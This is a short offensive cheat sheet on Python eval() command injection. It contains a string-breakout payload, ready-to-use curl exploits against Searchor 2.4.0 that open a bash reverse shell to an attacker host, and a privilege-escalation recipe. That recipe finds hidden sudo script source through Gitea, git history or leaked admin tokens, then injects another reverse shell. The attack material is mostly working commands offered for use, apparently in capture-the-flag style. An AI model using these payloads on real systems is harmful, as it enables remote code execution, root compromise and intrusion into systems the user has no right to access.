# Python eval() Command Injection

When user input reaches `eval()` or `exec()` in Python (common in CLI tools, web apps, templates):

```python
# Vulnerable pattern:
query = f"search(engine='{user_engine}', query='{user_query}')"
eval(query)  # user can break out of the string

# Payload (inject into a string parameter):
# engine: ',__import__('os').system('id'),'x
# Result: search(engine='',__import__('os').system('id'),'x', query='...')
```

## Exploit (Searchor 2.4.0 eval injection)

```bash
# POST to the search endpoint with payload in the 'engine' or 'query' field
curl -X POST http://<TARGET>/search \
  -d "engine=Google&query=test',__import__('os').system('bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'),'x"

# URL-encoded:
curl -X POST http://<TARGET>/search \
  --data-urlencode "engine=Google" \
  --data-urlencode "query=test',__import__('os').system('bash -c \"bash -i >/dev/tcp/<LHOST>/<LPORT> 0>&1\"'),'x"
```

## sudo script with restricted source access

If you can run `sudo /path/to/script.py` but can't read the script, look for:
1. A virtualhost (e.g. Gitea) with the script's source code
2. Git history leaking previous versions
3. Config files (`.gitea/`, `~/.config/`) with admin tokens to access the repo
```bash
# Common pattern: script checks a parameter and runs a command
sudo /path/to/script.py check <param>
# If <param> is used in subprocess.run() or os.system(), inject:
sudo /path/to/script.py check '; bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"'
```
